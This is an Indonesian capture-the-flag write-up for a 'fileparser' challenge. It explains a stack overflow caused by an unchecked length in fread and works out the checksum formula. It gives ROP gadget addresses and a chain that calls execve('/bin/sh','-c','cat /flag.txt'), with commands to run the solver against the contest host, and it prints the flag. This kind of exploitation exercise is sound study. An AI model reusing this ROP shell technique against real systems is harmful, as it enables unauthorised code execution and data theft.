# File parser

## Ringkasan

Parser membaca file dengan format:

- `u32 magic`
- `u32 length`
- `u64 checksum`
- `length` byte content

Bug utamanya ada di pembacaan content ke buffer stack fixed-size tanpa validasi panjang. `length` diambil langsung dari file dan dipakai sebagai argumen `fread()`, jadi return address bisa ditimpa.

Flag remote yang keluar dari service:

`NNS{d1d_y0u_f1nd_7h3_g4dg375_7948595bd8}`

## Proteksi Binary

Output awal:

```text
./fileparser: ELF 64-bit LSB executable, x86-64, statically linked, stripped
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
```

Implikasinya:

- `No PIE` membuat alamat gadget tetap.
- `No canary` membuat stack smash langsung bisa dipakai.
- `NX` memaksa payload ke ROP, bukan shellcode stack.
- Binary static memberi banyak gadget, jadi syscall raw lebih gampang.

## Analisis Program

`main` berada di `0x401d74`.

Urutan parsing yang terlihat dari disassembly:

```asm
401e4a: call 0x40c2b0    ; fread(&header, 4, 1, fp)
401e6e: call 0x40c2b0    ; fread(&length, 4, 1, fp)
401e92: call 0x40c2b0    ; fread(&checksum, 8, 1, fp)
401ebb: call 0x40c2b0    ; fread(buf, 1, length, fp)
```

Buffer content ada di `rbp-0x110`.

Header yang valid adalah `0x07030301`.

Fungsi checksum ada di `0x401d45`:

```asm
401d4d: movabs rax,0xaabbccdddeadbeef
401d5f: mov    rax,QWORD PTR [rax]     ; qword pertama file = magic|length
401d62: imul   rax,QWORD PTR [rbp-0x8]
401d67: not    rax
```

Jadi checksum yang benar:

```text
checksum = ~((magic | (length << 32)) * 0xaabbccdddeadbeef) mod 2^64
```

Content tidak ikut checksum. Ini penting karena overflow tetap bisa lolos validasi.

## Vulnerability

Overflow ada di pembacaan content:

```asm
401e9e: mov eax, DWORD PTR [rbp-0x12c] ; length
401ea6: mov rax, QWORD PTR [rbp-0x120] ; &buf
401ebb: call 0x40c2b0                  ; fread(buf, 1, length, fp)
```

Tidak ada check bahwa `length <= 0x110`.

## Menentukan Offset atau Primitive

Crash dengan cyclic menunjukkan frame layout:

- saved `rbx` tertimpa di offset `0x108`
- saved `rbp` tertimpa di offset `0x110`
- saved `rip` tertimpa di offset `0x118`

`gdb` saat crash:

```text
rip 0x401f9f
rbp 0x6361617463616173
rbx 0x6361617263616171
rsp -> 0x6361617663616175
```

Primitive yang terbukti:

- kontrol `RIP` pada offset `0x118`
- nilai checksum bisa dihitung offline
- alamat gadget fixed karena `No PIE`

## Strategi Exploit

Awalnya ORW via syscall juga jalan lokal, tapi remote memakai wrapper Python + `socat` PTY dan descriptor hasil `open()` tidak stabil untuk payload yang ringkas.

Strategi final lebih stabil:

1. Overflow return address.
2. Pakai gadget `mov [rdi], rax ; ret` untuk menulis string ke `.bss`.
3. Tulis:
   - `"/bin/sh\\0"`
   - `"-c\\0"`
   - `"cat /flag.txt\\0"`
   - array `argv = {"/bin/sh", "-c", "cat /flag.txt", NULL}`
4. Panggil `execve("/bin/sh", argv, NULL)` via syscall raw.

Gadget utama:

- `pop rax ; ret` = `0x429bc3`
- `pop rdi ; ret` = `0x47ae62`
- `pop rsi ; ret` = `0x47f6cf`
- `xchg rdx, rax ; ret` = `0x41e41a`
- `mov qword ptr [rdi], rax ; ret` = `0x43fbab`
- `syscall ; ret` = `0x412ad6`

## Pengembangan Payload

Struktur body:

```text
"A" * 0x118
+ ROP write "/bin/sh"
+ ROP write "-c"
+ ROP write "cat /flag.txt"
+ ROP write argv[]
+ execve syscall
```

Header file final:

```text
magic    = 0x07030301
length   = len(body)
checksum = ~((magic | (length << 32)) * 0xaabbccdddeadbeef) mod 2^64
```

## Exploit Final

Exploit final tersimpan di `solve.py`.

Poin penting implementasi:

- otomatis membangun `payload.bin`
- mendukung lokal, `GDB`, dan `REMOTE`
- untuk remote, payload dikirim ke wrapper dalam base64
- script memverifikasi pola flag `NNS{...}` sebelum menyatakan sukses

## Cara Menjalankan

Lokal langsung ke binary:

```bash
python3 solve.py FLAG=./local_flag.txt
```

Mode GDB:

```bash
python3 solve.py GDB FLAG=./local_flag.txt
```

Remote official challenge:

```bash
python3 solve.py REMOTE HOST=fileparser-d25bf68daf8b.chall.nnsc.tf PORT=1337
```

## Hasil

Output remote yang relevan:

```text
Parsing file: /tmp/370e9a3a4aea2538.k
File format is valid
Checksum is valid
Header : 0x07030301
Length : 000002a8
Checksum : 0x2caa126c52487410
NNS{d1d_y0u_f1nd_7h3_g4dg375_7948595bd8}
```

## Catatan Stabilitas

- Payload `execve` lebih pendek daripada payload ORW, jadi aman terhadap batas line input wrapper PTY.
- Exploit lokal berhasil konsisten dengan `FLAG=./local_flag.txt`.
- Exploit remote berhasil tanpa alamat hardcoded yang bergantung pada ASLR stack atau libc base.
